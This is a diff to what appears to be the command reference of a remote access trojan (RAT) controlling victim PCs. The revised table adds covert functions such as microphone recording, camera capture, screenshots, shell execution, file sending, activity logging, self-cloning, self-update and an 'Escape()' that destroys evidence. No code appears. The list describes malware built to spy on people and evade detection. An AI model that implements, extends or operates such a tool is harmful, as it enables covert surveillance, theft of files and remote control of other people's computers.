@@ -4,27 +4,44 @@ List of Built-in PC functions
 Eg: PC.Lock("A01");
 
 ------------------------------------------------
-Command     Ack     Description
+Command         Ack     Description
 ------------------------------------------------
-Lock(x)      N      Select Target
-Cmd(x)       Y      Run Batch Command
-Delay(x)     N      Pause Execution temporarily for 'x' milliseconds
-Google(x)    Y      Googles selected Text
-Play(x)      Y      Play a Remote (mp3) Audio File (URL)
-Speak(x)     Y      Text to Speech
-Marco()      Y      Returns Polo if Online
-Escape()     Y      Destroy Evidence and Escape
-Stop()       Y      End Execution
-Update(x)    Y      Updates self
-Vbs(x)       Y      Runs VB Script
-Bat(x)       Y      Runs Bat Script
-Info(x)      Y      Shows Info box
-Warn(x)      Y      Shows Warning Box
-Error(x)     Y      Shows Error box
-Type(x)      Y      Types selected text
-Excape(x)    Y      Execute Batch script and Escape()
-Rename(x)    Y      Renames RAT
-Clone()      Y      Initiate Clone Operations
+Excape(x)        Y      Execute Batch script and Escape()
+Escape()         Y      Destroy Evidence and Escape
+Marco()          Y      Returns Polo if Online
+Close()          Y      End Execution
+Update(x)        Y      Updates self
+Hibernate(x)     Y      Hibernate till date
+Revive()         Y      End Hibernation  
+Notify()         Y      Notifies power schedule
+Rename(x)        Y      Renames RAT
+Flash()          N      Flashes Screen, Visual Indication
+Vbs(x)           Y      Runs .VBS Script
+Bat(x)           Y      Runs .Bat Script
+Shell(x)         Y      Runs Shell Commands
+Speak(x)         Y      Text to Speech
+Play(x)          Y      Play a Remote (mp3) Audio File (URL)
+Mic(x)           N      Records audio for 'x' ms
+Lock(x)          N      Select Target
+Info(x)          Y      Shows Info box
+Warn(x)          Y      Shows Warning Box
+Error(x)         Y      Shows Error box
+Msgbox(x,y)      Y      Shows Msg Box fo 'y' ms
+Google(x)        Y      Googles selected Text
+Web(x)           Y      Navigates to 'x' url
+Type(x)          Y      Types custom text
+Screenshot(x)    Y      Takes a Screenshot
+Camera(x)        Y      Captures a Photo
+Disk(x)          Y      Retrieves Disk Info
+Tree(x)          Y      Retrieves Disk Info
+Send(x)          Y      Sends a File
+Zip(x)           Y      Zip a folder
+Unzip(x)         Y      Unzips file
+Health(x)        Y      Reports back working conditions
+Log(x)           Y      Logs every Activity
+Delay(x)         N      Pause Execution temporarily for 'x' ms
+Clone()          Y      Initiate Clone Operations
+Noclone()        Y      Stops Cloning op
 
 And more...
 
